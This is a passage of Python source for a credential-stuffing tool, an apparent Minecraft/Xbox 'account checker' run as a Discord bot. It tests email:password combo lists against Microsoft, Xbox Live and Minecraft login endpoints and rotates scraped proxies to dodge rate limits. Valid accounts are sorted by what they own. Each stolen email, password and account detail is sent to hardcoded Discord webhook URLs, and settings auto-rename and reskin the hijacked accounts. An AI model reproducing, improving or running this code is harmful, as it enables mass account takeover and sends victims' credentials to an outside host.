                    CAPTURE = Capture(email, password, "N/A", "N/A", "N/A", "N/A", "Xbox Game Pass Ultimate [Unset MC]", session)
                    CAPTURE.handle(session)
                return True
            elif 'product_game_pass_pc' in checkrq.text:
                xgp+=1
                cpm+=1
                checked+=1
                if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Xbox Game Pass: {email}:{password}")
                with open(f"results/{fname}/XboxGamePass.txt", 'a') as f: f.write(f"{email}:{password}\n")
                capture_mc(token, session, email, password, "Xbox Game Pass")
                return True
            elif '"product_minecraft"' in checkrq.text:
                checked+=1
                cpm+=1
                capture_mc(token, session, email, password, "Normal")
                return True
            else:
                others = []
                if 'product_minecraft_bedrock' in checkrq.text:
                    others.append("Minecraft Bedrock")
                if 'product_legends' in checkrq.text:
                    others.append("Minecraft Legends")
                if 'product_dungeons' in checkrq.text:
                    others.append('Minecraft Dungeons')
                if others != []:
                    other+=1
                    cpm+=1
                    checked+=1
                    items = ', '.join(others)
                    open(f"results/{fname}/Other.txt", 'a').write(f"{email}:{password} | {items}\n")
                    if screen == "'2'": print(Fore.YELLOW+f"Other: {email}:{password} | {items}")
                    return True
                else:
                    return False
        elif checkrq.status_code == 429:
            retries+=1
            session.proxies = getproxy()
            if len(proxylist) < 1: time.sleep(20)
            loop_tries += 1
            continue
        else:
            return False
    return False

def mc_token(session, uhs, xsts_token):
    global retries
    max_tries = maxretries if maxretries > 0 else 5
    tries = 0
    while tries < max_tries:
        try:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
            if mc_login.status_code == 429:
                session.proxies = getproxy()
                if len(proxylist) < 1: time.sleep(20)
                tries += 1
                continue
            else:
                return mc_login.json().get('access_token')
        except:
            retries+=1
            session.proxies = getproxy()
            tries += 1
            continue
    return None

def authenticate(email, password, tries = 0):
    global retries, bad, checked, cpm
    try:
        session = requests.Session()
        session.verify = False
        session.proxies = getproxy()
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token != "None":
            hit = False
            try:
                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xbox_login.json()
                xbox_token = js.get('Token')
                if xbox_token != None:
                    uhs = js['DisplayClaims']['xui'][0]['uhs']
                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                    js = xsts.json()
                    xsts_token = js.get('Token')
                    if xsts_token != None:
                        access_token = mc_token(session, uhs, xsts_token)
                        if access_token != None:
                            hit = checkmc(session, email, password, access_token)
            except: pass
            if hit == False: validmail(email, password)
    except:
        if tries < maxretries:
            tries+=1
            retries+=1
            authenticate(email, password, tries)
        else:
            bad+=1
            checked+=1
            cpm+=1
            if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
    finally:
        session.close()

def Load(filename):
    global Combos, fname
    if filename is None:
        return False, "Invalid File."
    else:
        fname = os.path.splitext(os.path.basename(filename))[0]
        try:
            with open(filename, 'r+', encoding='utf-8') as e:
                lines = e.readlines()
                Combos = list(set(lines))
                return True, f"[{str(len(lines) - len(Combos))}] Dupes Removed.\n[{len(Combos)}] Combos Loaded."
        except:
            return False, "Your file is probably harmed."

def Proxys(file_path):
    global proxylist
    try:
        with open(file_path, 'r+', encoding='utf-8', errors='ignore') as e:
            ext = e.readlines()
            for line in ext:
                try:
                    proxyline = line.split()[0].replace('\n', '')
                    proxylist.append(proxyline)
                except: pass
        return True, f"Loaded [{len(proxylist)}] proxies."
    except Exception:
        return False, "Your file is probably harmed."

def getproxy():
    if proxytype == "'4'":
        return None
    if len(proxylist) == 0:
        return None
    try:
        proxy = random.choice(proxylist)
        # Handle case where proxy is already a dict (from auto-scraper)
        if isinstance(proxy, dict):
            return proxy
        # Handle case where proxy is a string (from file loading)
        if proxytype == "'1'" or proxytype == "'5'":
            return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        elif proxytype == "'2'":
            return {'http': 'socks4://'+proxy, 'https': 'socks4://'+proxy}
        elif proxytype == "'3'":
            return {'http': 'socks5://'+proxy, 'https': 'socks5://'+proxy}
        else:
            return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
    except:
        return None

def Checker(combo):
    global bad, checked, cpm
    try:
        split = combo.strip().split(":")
        email = split[0]
        password = split[1]
        if email != "" and password != "":
            authenticate(str(email), str(password))
        else:
            if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}")
            bad+=1
            cpm+=1
            checked+=1
    except:
        if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}")
        bad+=1
        cpm+=1
        checked+=1

def loadconfig():
    global maxretries, config

    def str_to_bool(value):
        return value.lower() in ('yes', 'true', 't', '1')

    default_config = {
        'Settings': {
            'Webhook': 'https://discord.com/api/webhooks/1460816282491555975/FprCbofwBWm-VdynBzmHgFVV1KbrD4UHyISl3V1uNWkQi_b0AI61XtKdirrv4aPYBs6V',
            'BannedWebhook': 'https://discord.com/api/webhooks/1460816282491555975/FprCbofwBWm-VdynBzmHgFVV1KbrD4UHyISl3V1uNWkQi_b0AI61XtKdirrv4aPYBs6V',
            'UnbannedWebhook': 'https://discord.com/api/webhooks/1460816282491555975/FprCbofwBWm-VdynBzmHgFVV1KbrD4UHyISl3V1uNWkQi_b0AI61XtKdirrv4aPYBs6V',
            'Embed': True,
            'Max Retries': 5,
            'Proxyless Ban Check': True,
            'WebhookMessage': ''' ||`<email>:<password>`||
Name: <name>
Account Type: <type>
Hypixel: <hypixel>
Hypixel Level: <level>
First Hypixel Login: <firstlogin>
Last Hypixel Login: <lastlogin>
Optifine Cape: <ofcape>
MC Capes: <capes>
Email Access: <access>
Hypixel Skyblock Coins: <skyblockcoins>
Hypixel Bedwars Stars: <bedwarsstars>
Banned: <banned>
Can Change Name: <namechange>
Last Name Change: <lastchanged>'''
        },
        'Scraper': {
            'Auto Scrape Minutes': 5
        },
        'Auto': {
            'Set Name': True,
            'Name': 'VaultCore',
            'Set Skin': True,
            'Skin': 'https://s.namemc.com/i/bc8429d1f2e15539.png',
            'Skin Variant': 'classic'
        },
        'Captures': {
            'Hypixel Name': True,
            'Hypixel Level': True,
            'First Hypixel Login': True,
            'Last Hypixel Login': True,
            'Optifine Cape': True,
            'Minecraft Capes': True,
            'Email Access': True,
            'Hypixel Skyblock Coins': True,
            'Hypixel Bedwars Stars': True,
            'Hypixel Ban': True,
            'Name Change Availability': True,
            'Last Name Change': True,
            'Payment': True,
            'Donut SMP Ban': True
        }
    }
    if not os.path.isfile("config.ini"):
        c = configparser.ConfigParser(allow_no_value=True)
        for section, values in default_config.items():
            c[section] = values
        with open('config.ini', 'w') as configfile:
            c.write(configfile)
    read_config = configparser.ConfigParser()
    read_config.read('config.ini')
    config_updated = False
    for section, values in default_config.items():
        if section not in read_config:
            read_config[section] = values
            config_updated = True
        else:
            for key, value in values.items():
                if key not in read_config[section]:
                    read_config[section][key] = str(value)
                    config_updated = True
    if config_updated:
        with open('config.ini', 'w') as configfile:
            read_config.write(configfile)
    # settings
    maxretries = int(read_config['Settings']['Max Retries'])
    config.set('webhook', str(read_config['Settings']['Webhook']))
    config.set('embed', str_to_bool(read_config['Settings']['Embed']))
    config.set('message', str(read_config['Settings']['WebhookMessage']))
    config.set('proxylessban', str_to_bool(read_config['Settings']['Proxyless Ban Check']))
    config.set('BannedWebhook', str(read_config['Settings']['BannedWebhook']))
    config.set('UnbannedWebhook', str(read_config['Settings']['UnbannedWebhook']))
    # scraper
    config.set('autoscrape', int(read_config['Scraper']['Auto Scrape Minutes']))
    # auto
    config.set('setname', str_to_bool(read_config['Auto']['Set Name']))
    config.set('name', str(read_config['Auto']['Name']))
    config.set('setskin', str_to_bool(read_config['Auto']['Set Skin']))
    config.set('skin', str(read_config['Auto']['Skin']))
    config.set('variant', str(read_config['Auto']['Skin Variant']))
    # capture
    config.set('hypixelname', str_to_bool(read_config['Captures']['Hypixel Name']))
    config.set('hypixellevel', str_to_bool(read_config['Captures']['Hypixel Level']))
    config.set('hypixelfirstlogin', str_to_bool(read_config['Captures']['First Hypixel Login']))
    config.set('hypixellastlogin', str_to_bool(read_config['Captures']['Last Hypixel Login']))
    config.set('optifinecape', str_to_bool(read_config['Captures']['Optifine Cape']))
    config.set('mcapes', str_to_bool(read_config['Captures']['Minecraft Capes']))
    config.set('access', str_to_bool(read_config['Captures']['Email Access']))
    config.set('hypixelsbcoins', str_to_bool(read_config['Captures']['Hypixel Skyblock Coins']))
    config.set('hypixelbwstars', str_to_bool(read_config['Captures']['Hypixel Bedwars Stars']))
    config.set('hypixelban', str_to_bool(read_config['Captures']['Hypixel Ban']))
    config.set('namechange', str_to_bool(read_config['Captures']['Name Change Availability']))
    config.set('lastchanged', str_to_bool(read_config['Captures']['Last Name Change']))
    config.set('payment', str_to_bool(read_config['Captures']['Payment']))
    config.set('donutsmp', str_to_bool(read_config['Captures']['Donut SMP Ban']))

def get_proxies():
    global proxylist
    http = []
    socks4 = []
    socks5 = []
    api_http = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt"
    ]
    api_socks4 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt"
    ]
    api_socks5 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt"
    ]
    for service in api_http:
        try:
            http.extend(requests.get(service, timeout=30).text.splitlines())
        except: pass
    for service in api_socks4: 
        try:
            socks4.extend(requests.get(service, timeout=30).text.splitlines())
        except: pass
    for service in api_socks5: 
        try:
            socks5.extend(requests.get(service, timeout=30).text.splitlines())
        except: pass
    try:
        for dta in requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks4&limit=500", timeout=30).json().get('data', []):
            socks4.append(f"{dta.get('ip')}:{dta.get('port')}")
    except: pass
    try:
        for dta in requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks5&limit=500", timeout=30).json().get('data', []):
            socks5.append(f"{dta.get('ip')}:{dta.get('port')}")
    except: pass
    http = list(set(http))
    socks4 = list(set(socks4))
    socks5 = list(set(socks5))
    proxylist.clear()
    for proxy in http: 
        if proxy.strip(): proxylist.append({'http': 'http://'+proxy.strip(), 'https': 'http://'+proxy.strip()})
    for proxy in socks4: 
        if proxy.strip(): proxylist.append({'http': 'socks4://'+proxy.strip(),'https': 'socks4://'+proxy.strip()})
    for proxy in socks5: 
        if proxy.strip(): proxylist.append({'http': 'socks5://'+proxy.strip(),'https': 'socks5://'+proxy.strip()})
    if screen == "'2'": print(Fore.LIGHTBLUE_EX+f'Scraped [{len(proxylist)}] proxies')
    autoscrape_time = config.get('autoscrape')
    if autoscrape_time and autoscrape_time > 0:
        time.sleep(autoscrape_time * 60)
        get_proxies()

def banproxyload(file_path):
    global banproxies
    try:
        with open(file_path, 'r+', encoding='utf-8', errors='ignore') as e:
            ext = e.readlines()
            for line in ext:
                try:
                    proxyline = line.split()[0].replace('\n', '')
                    banproxies.append(proxyline)
                except: pass
        return True, f"Loaded [{len(banproxies)}] ban proxies."
    except Exception:
        return False, "Your file is probably harmed."

# Discord Bot Implementation
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='/', intents=intents)
synced_commands = False

# Global variables for checker control
active_checkers = {}

# Load owner ID from environment
load_dotenv()
OWNER_ID = int(os.getenv('OWNER_ID', 0)) if os.getenv('OWNER_ID') else None

# Auto upload scheduler functions
async def upload_banned_hits():
    """Upload ONLY 1 banned hit every 10 minutes"""
    global banned_hits_queue
    
    # If queue is empty, do nothing
    if not banned_hits_queue:
        return
    
    webhook_url = config.get('BannedWebhook') or config.get('webhook')
    if not webhook_url:
        return
    
    try:
        # Pop exactly ONE hit from the queue (first in, first out)
        hit = banned_hits_queue.pop(0)
        
        # Check if embed mode is enabled
        if config.get('embed') == True:
            payload = {
                "username": "Vex Development",
                "avatar_url": f"https://mc-heads.net/avatar/{hit['name']}",
                "embeds": [
                    {
                        "author": {
                            "name": "Vex Development Premium", 
                            "url": "https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png",
                            "icon_url": "https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png"
                        },
                        "title": f"<a:stolen_emoji_blaze:1450910347954229440> {hit['name']}",
                        "description": "**Account Information**",
                        "color": 0xFF0000,
                        "fields": [
                            {"name": "<a:mail:1415294347162681355> ᴇᴍᴀɪʟ", "value": f"||`{hit['email']}`||", "inline": True},
                            {"name": "<a:password:1415294427752038511> ᴘᴀꜱꜱᴡᴏʀᴅ", "value": f"||`{hit['password']}`||", "inline": True},
                            {"name": "<a:banned:1415293976445194243> ʙᴀɴ ꜱᴛᴀᴛᴜꜱ", "value": f"**{hit['banned']}**", "inline": True},
                            {"name": "\u200b", "value": "**ᴍɪɴᴇᴄʀᴀꜰᴛ ᴅᴇᴛᴀɪʟꜱ**", "inline": False},
                            {"name": "<a:hypixel:1415293267804815391> ʜʏᴘɪxᴇʟ ᴜꜱᴇʀɴᴀᴍᴇ", "value": f"`{hit.get('hypixl') or 'N/A'}`", "inline": True},
                            {"name": "<a:name:1415295283948027924> ɴᴀᴍᴇ ᴄʜᴀɴɢᴇᴀʙʟᴇ", "value": f"`{hit.get('namechanged') or 'N/A'}`", "inline": True},
                            {"name": "<a:ms_coin:1415293380690186240> ʜʏᴘɪxᴇʟ ʟᴇᴠᴇʟ", "value": f"`{hit.get('level') or 'N/A'}`", "inline": True},
                            {"name": "\u200b", "value": "**Cosmetics & Stats**", "inline": False},
                            {"name": "<a:cape:1415293674647982121> ᴄᴀᴘᴇꜱ", "value": f"`{hit.get('capes') or 'None'}` | **Optifine:** `{hit.get('cape') or 'No'}`", "inline": True},
                            {"name": "<a:mcfa:1415293802402414634> ᴀᴄᴄᴏᴜɴᴛ ᴛʏᴘᴇ", "value": f"**{hit['type'] or 'N/A'}**", "inline": True},
                            {"name": "\u200b", "value": "**Activity Timeline**", "inline": False},
                            {"name": "<:emoji_1:1450698111172214805> ꜰɪʀꜱᴛ ʟᴏɢɪɴ", "value": f"`{hit.get('firstlogin') or 'N/A'}`", "inline": True},
                            {"name": "<a:emoji_2:1450698140784132226> ʟᴀꜱᴛ ʟᴏɢɪɴ", "value": f"`{hit.get('lastlogin') or 'N/A'}`", "inline": True},
                            {"name": "<:emoji_3:1450698187277864960> ʟᴀꜱᴛ ɴᴀᴍᴇ ᴄʜᴀɴɢᴇ", "value": f"`{hit.get('lastchanged') or 'N/A'}`", "inline": True},
                            {"name": "\u200b", "value": "**Game Statistics**", "inline": False},
                            {"name": "<a:emoji_4:1450698212112465971> ꜱᴋʏʙʟᴏᴄᴋ ᴄᴏɪɴꜱ", "value": f"**{hit.get('sbcoins') or 'N/A'}**", "inline": True},
                            {"name": "<a:emoji_7:1450698237060321301> ʙᴇᴅᴡᴀʀꜱ ꜱᴛᴀʀꜱ", "value": f"**{hit.get('bwstars') or 'N/A'}**", "inline": True},
                            {"name": "<:emoji_6:1450698265011032127> ᴇᴍᴀɪʟ ᴀᴄᴄᴇꜱꜱ", "value": f"**{hit.get('access') or 'N/A'}**", "inline": True},
                            {"name": "<a:MicrosoftMojang:1415294909006745691> ᴄᴏᴍʙᴏ", "value": f"||`{hit['email']}:{hit['password']}`||", "inline": True},
                        ],
                        "thumbnail": {"url": f"https://mc-heads.net/avatar/{hit['name']}"},
                        "image": {"url": "https://i.ibb.co/p6JN39nJ/standard.gif"},
                        "footer": {
                            "text": "Vex Development • Premium Account Checker • Made with ❤️ by Vortex",
                            "icon_url": "https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png"
                        },
                        "timestamp": datetime.now(timezone.utc).isoformat()
                    }
                ]
            }
            
            # Add Donut SMP info if available
            if hit.get('donut_banned'):
                donut_status = hit.get('donut_banned')
                if "BANNED" in str(donut_status).upper():
                    donut_info = f"<a:stolen_emoji_blaze:1450908986860634304> **ʙᴀɴɴᴇᴅ**"
                    if hit.get('donut_ban_reason'):
                        donut_info += f"\n**ʀᴇᴀꜱᴏɴ** {hit.get('donut_ban_reason')}"
                    if hit.get('donut_time_left'):
                        donut_info += f"\n**ᴛɪᴍᴇ ʟᴇꜰᴛ** {hit.get('donut_time_left')}"
                    if hit.get('donut_ban_id'):
                        donut_info += f"\n**ʙᴀɴ ɪᴅ** {hit.get('donut_ban_id')}"
                elif "NOT BANNED" in str(donut_status).upper() or "UNBANNED" in str(donut_status).upper():
                    donut_info = "<a:stolen_emoji_blaze:1450908885677248593> **ᴜɴʙᴀɴɴᴇᴅ**"
                else:
                    donut_info = str(donut_status)
                
                payload['embeds'][0]['fields'].append({
                    "name": "<a:emoji_10:1450903257554620570> ᴅᴏɴᴜᴛ ꜱᴍᴘ ʙᴀɴ ꜱᴛᴀᴛᴜꜱ", 
                    "value": donut_info, 
                    "inline": False
                })
            
            # Add Donut SMP Stats if available
            donut_stats_parts = []
            if hit.get('donut_playtime'):
                donut_stats_parts.append(f"<a:stolen_emoji_blaze:1450911170105049188> **ᴘʟᴀʏᴛɪᴍᴇ➜** {hit.get('donut_playtime')}")
            if hit.get('donut_coins'):
                donut_stats_parts.append(f"<a:emoji_4:1450698212112465971> **ᴄᴏɪɴꜱ➜** {hit.get('donut_coins')}")
            if hit.get('donut_level'):
                donut_stats_parts.append(f"<a:stolen_emoji_blaze:1450911473252569260> **ʟᴇᴠᴇʟ➜** {hit.get('donut_level')}")
            if hit.get('donut_kills'):
                donut_stats_parts.append(f"<:stolen_emoji_blaze:1450911645500051728> **ᴋɪʟʟꜱ➜** {hit.get('donut_kills')}")
            if hit.get('donut_deaths'):
                donut_stats_parts.append(f"<a:stolen_emoji_blaze:1450911839146999879> **ᴅᴇᴀᴛʜꜱ➜** {hit.get('donut_deaths')}")
            if hit.get('donut_kdr'):
                donut_stats_parts.append(f"<:stolen_emoji_blaze:1450912068701130956> **ᴋ/ᴅ➜** {hit.get('donut_kdr')}")
            
            if donut_stats_parts:
                payload['embeds'][0]['fields'].append({
                    "name": "<a:emoji_10:1450903257554620570> ᴅᴏɴᴜᴛ ꜱᴍᴘ ꜱᴛᴀᴛꜱ (Grind)", 
                    "value": "\n".join(donut_stats_parts), 
                    "inline": False
                })
        else:
            payload = {
                "content": config.get('message')
                    .replace("<email>", hit['email'])
                    .replace("<password>", hit['password'])
                    .replace("<name>", hit['name'] or "N/A")
                    .replace("<hypixel>", hit.get('hypixl') or "N/A")
                    .replace("<level>", hit.get('level') or "N/A")
                    .replace("<firstlogin>", hit.get('firstlogin') or "N/A")
                    .replace("<lastlogin>", hit.get('lastlogin') or "N/A")
                    .replace("<ofcape>", hit.get('cape') or "N/A")
                    .replace("<capes>", hit.get('capes') or "N/A")
                    .replace("<access>", hit.get('access') or "N/A")
                    .replace("<skyblockcoins>", hit.get('sbcoins') or "N/A")
                    .replace("<bedwarsstars>", hit.get('bwstars') or "N/A")
                    .replace("<banned>", hit['banned'] or "Unknown")
                    .replace("<namechange>", hit.get('namechanged') or "N/A")
                    .replace("<lastchanged>", hit.get('lastchanged') or "N/A")
                    .replace("<type>", hit['type'] or "N/A"),
                "username": "Vex Development"
            }
        
        # Send to webhook
        requests.post(webhook_url, json=payload)
        print(f"<a:stolen_emoji_blaze:1450912362327572602> Uploaded 1 banned hit: {hit['email']} | Queue remaining: {len(banned_hits_queue)}")
    except Exception as e:
        print(f"<a:emoji_9:1450903287606804632> Error uploading banned hit: {e}")

async def upload_unbanned_hits():
    """Upload ONLY 1 unbanned hit every 15 minutes"""
    global unbanned_hits_queue
    
    # If queue is empty, do nothing
    if not unbanned_hits_queue:
        return
    
    webhook_url = config.get('UnbannedWebhook') or config.get('webhook')
    if not webhook_url:
        return
    
    try:
        # Pop exactly ONE hit from the queue (first in, first out)
        hit = unbanned_hits_queue.pop(0)
        
        # Check if embed mode is enabled
        if config.get('embed') == True:
            payload = {
                "username": "Vex Development",
                "avatar_url": f"https://mc-heads.net/avatar/{hit['name']}",
                "embeds": [
                    {
                        "author": {
                            "name": "ᴠᴇx ᴅᴇᴠᴇʟᴏᴘᴍᴇɴᴛ ᴘʀᴇᴍɪᴜᴍ", 
                            "url": "https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png",
                            "icon_url": "https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png"
                        },
                        "title": f"<a:stolen_emoji_blaze:1450910347954229440> {hit['name']}",
                        "description": "**ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ**",
                        "color": 0x00FF00,
                        "fields": [
                            {"name": "<a:mail:1415294347162681355> ᴇᴍᴀɪʟ", "value": f"||`{hit['email']}`||", "inline": True},
                            {"name": "<a:password:1415294427752038511> ᴘᴀꜱꜱᴡᴏʀᴅ", "value": f"||`{hit['password']}`||", "inline": True},
                            {"name": "<a:banned:1415293976445194243> ʙᴀɴ ꜱᴛᴀᴛᴜꜱ", "value": f"**{hit['banned']}**", "inline": True},
                            {"name": "\u200b", "value": "**Minecraft Details**", "inline": False},
                            {"name": "<a:hypixel:1415293267804815391> ʜʏᴘɪxᴇʟ ᴜꜱᴇʀɴᴀᴍᴇ", "value": f"`{hit.get('hypixl') or 'N/A'}`", "inline": True},
                            {"name": "<a:name:1415295283948027924> ɴᴀᴍᴇ ᴄʜᴀɴɢᴇ ᴀᴠᴀɪʟᴀʙʟᴇ", "value": f"`{hit.get('namechanged') or 'N/A'}`", "inline": True},
                            {"name": "<a:ms_coin:1415293380690186240> ʜʏᴘɪxᴇʟ ʟᴇᴠᴇʟ", "value": f"`{hit.get('level') or 'N/A'}`", "inline": True},
                            {"name": "\u200b", "value": "**Cosmetics & Stats**", "inline": False},
                            {"name": "<a:cape:1415293674647982121> ᴄᴀᴘᴇꜱ", "value": f"`{hit.get('capes') or 'None'}` | **Optifine:** `{hit.get('cape') or 'No'}`", "inline": True},
                            {"name": "<a:mcfa:1415293802402414634> ᴀᴄᴄᴏᴜɴᴛ ᴛʏᴘᴇ", "value": f"**{hit['type'] or 'N/A'}**", "inline": True},
                            {"name": "\u200b", "value": "**Activity Timeline**", "inline": False},
                            {"name": "<:emoji_1:1450698111172214805> ꜰɪʀꜱᴛ ʟᴏɢɪɴ", "value": f"`{hit.get('firstlogin') or 'N/A'}`", "inline": True},
                            {"name": "<a:emoji_2:1450698140784132226> ʟᴀꜱᴛ ʟᴏɢɪɴ", "value": f"`{hit.get('lastlogin') or 'N/A'}`", "inline": True},
                            {"name": "<:emoji_3:1450698187277864960> ʟᴀꜱᴛ ɴᴀᴍᴇ ᴄʜᴀɴɢᴇ", "value": f"`{hit.get('lastchanged') or 'N/A'}`", "inline": True},
                            {"name": "\u200b", "value": "**ɢᴀᴍᴇ ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ**", "inline": False},
                            {"name": "<a:emoji_4:1450698212112465971> ʜʏᴘɪxᴇʟ ᴄᴏɪɴꜱ", "value": f"**{hit.get('sbcoins') or 'N/A'}**", "inline": True},
                            {"name": "<a:emoji_7:1450698237060321301> ʙᴇᴅᴡᴀʀꜱ ꜱᴛᴀʀꜱ", "value": f"**{hit.get('bwstars') or 'N/A'}**", "inline": True},
                            {"name": "<:emoji_6:1450698265011032127> ᴇᴍᴀɪʟ ᴀᴄᴄᴇꜱꜱ", "value": f"**{hit.get('access') or 'N/A'}**", "inline": True},
                            {"name": "<a:MicrosoftMojang:1415294909006745691> ꜰᴜʟʟ ᴄᴏᴍʙᴏ", "value": f"||`{hit['email']}:{hit['password']}`||", "inline": True},
                        ],
                        "thumbnail": {"url": f"https://mc-heads.net/avatar/{hit['name']}"},
                        "image": {"url": "https://i.ibb.co/p6JN39nJ/standard.gif"},
                        "footer": {
                            "text": "Vex Development • Premium Account Checker • Made with ❤️ by Vortex",
                            "icon_url": "https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png"
                        },
                        "timestamp": datetime.now(timezone.utc).isoformat()
                    }
                ]
            }
            
            # Add Donut SMP info if available
            if hit.get('donut_banned'):
                donut_status = hit.get('donut_banned')
                if "BANNED" in str(donut_status).upper():
                    donut_info = f"<a:stolen_emoji_blaze:1450908986860634304> **BANNED**"
                    if hit.get('donut_ban_reason'):
                        donut_info += f"\n**Reason➜** {hit.get('donut_ban_reason')}"
                    if hit.get('donut_time_left'):
                        donut_info += f"\n**Time Left➜** {hit.get('donut_time_left')}"
                    if hit.get('donut_ban_id'):
                        donut_info += f"\n**Ban ID➜** {hit.get('donut_ban_id')}"
                elif "NOT BANNED" in str(donut_status).upper() or "UNBANNED" in str(donut_status).upper():
                    donut_info = "<a:stolen_emoji_blaze:1450908885677248593> **Not Banned**"
                else:
                    donut_info = str(donut_status)
                
                payload['embeds'][0]['fields'].append({
                    "name": "<a:emoji_10:1450903257554620570> Donut SMP Ban Status", 
                    "value": donut_info, 
                    "inline": False
                })
            
            # Add Donut SMP Stats if available
            donut_stats_parts = []
            if hit.get('donut_playtime'):
                donut_stats_parts.append(f"<a:stolen_emoji_blaze:1450911170105049188> **Playtime➜** {hit.get('donut_playtime')}")
            if hit.get('donut_coins'):
                donut_stats_parts.append(f"<a:emoji_4:1450698212112465971> **Coins➜** {hit.get('donut_coins')}")
            if hit.get('donut_level'):
                donut_stats_parts.append(f"<a:stolen_emoji_blaze:1450911473252569260> **Level➜** {hit.get('donut_level')}")
            if hit.get('donut_kills'):
                donut_stats_parts.append(f"<:stolen_emoji_blaze:1450911645500051728>️ **Kills➜** {hit.get('donut_kills')}")
            if hit.get('donut_deaths'):
                donut_stats_parts.append(f"<a:stolen_emoji_blaze:1450911839146999879> **Deaths➜** {hit.get('donut_deaths')}")
            if hit.get('donut_kdr'):
                donut_stats_parts.append(f"<:status:1447587161766498437> **K/D➜** {hit.get('donut_kdr')}")
            
            if donut_stats_parts:
                payload['embeds'][0]['fields'].append({
                    "name": "<a:emoji_10:1450903257554620570> Donut SMP Stats (Grind)", 
                    "value": "\n".join(donut_stats_parts), 
                    "inline": False
                })
        else:
            payload = {
                "content": config.get('message')
                    .replace("<email>", hit['email'])
                    .replace("<password>", hit['password'])
                    .replace("<name>", hit['name'] or "N/A")
                    .replace("<hypixel>", hit.get('hypixl') or "N/A")
                    .replace("<level>", hit.get('level') or "N/A")
                    .replace("<firstlogin>", hit.get('firstlogin') or "N/A")
                    .replace("<lastlogin>", hit.get('lastlogin') or "N/A")
                    .replace("<ofcape>", hit.get('cape') or "N/A")
                    .replace("<capes>", hit.get('capes') or "N/A")
                    .replace("<access>", hit.get('access') or "N/A")
                    .replace("<skyblockcoins>", hit.get('sbcoins') or "N/A")
                    .replace("<bedwarsstars>", hit.get('bwstars') or "N/A")
                    .replace("<banned>", hit['banned'] or "Unknown")
                    .replace("<namechange>", hit.get('namechanged') or "N/A")
                    .replace("<lastchanged>", hit.get('lastchanged') or "N/A")
                    .replace("<type>", hit['type'] or "N/A"),
                "username": "Vex Development"
            }
        
        # Send to webhook
        requests.post(webhook_url, json=payload)
        print(f"<a:stolen_emoji_blaze:1450912362327572602> Uploaded 1 unbanned hit: {hit['email']} | Queue remaining: {len(unbanned_hits_queue)}")
    except Exception as e:
        print(f"<a:emoji_9:1450903287606804632> Error uploading unbanned hit: {e}")

@tasks.loop(minutes=10)
async def banned_hits_uploader():
    """Task to upload banned hits every 10 minutes - uploads ONLY 1 hit per cycle"""
    try:
        await upload_banned_hits()
    except Exception as e:
        print(f"❌ Error in banned_hits_uploader: {e}")
        traceback.print_exc()

@banned_hits_uploader.before_loop
async def before_banned_hits_uploader():
    """Wait for bot to be ready before starting the task"""
    await bot.wait_until_ready()

@tasks.loop(minutes=15)
async def unbanned_hits_uploader():
    """Task to upload unbanned hits every 15 minutes - uploads ONLY 1 hit per cycle"""
    try:
        await upload_unbanned_hits()
    except Exception as e:
        print(f"❌ Error in unbanned_hits_uploader: {e}")
        traceback.print_exc()

@unbanned_hits_uploader.before_loop
async def before_unbanned_hits_uploader():
    """Wait for bot to be ready before starting the task"""
    await bot.wait_until_ready()

# Utility function to check if user is authorized
def is_authorized(user_id):
    """Check if user is authorized to use the bot"""
    if OWNER_ID and user_id == OWNER_ID:
        return True
    return user_id in AUTHORIZED_USERS

# Decorator for owner-only commands
def owner_only():
    async def predicate(interaction: discord.Interaction):
        if OWNER_ID and interaction.user.id == OWNER_ID:
            return True
        await interaction.response.send_message("<a:emoji_9:1450903287606804632> This command is only available to the bot owner.", ephemeral=True)
        return False
    return discord.app_commands.check(predicate)

class CheckerSession:
    def __init__(self, ctx, threads, proxy_type, combos_file, proxies_file=None, webhook_url=None):
        self.ctx = ctx
        self.threads = threads
        self.proxy_type = proxy_type
        self.combos_file = combos_file
        self.proxies_file = proxies_file
        self.webhook_url = webhook_url
        self.session_id = str(ctx.id)
        self.is_running = True
        self.stats = {
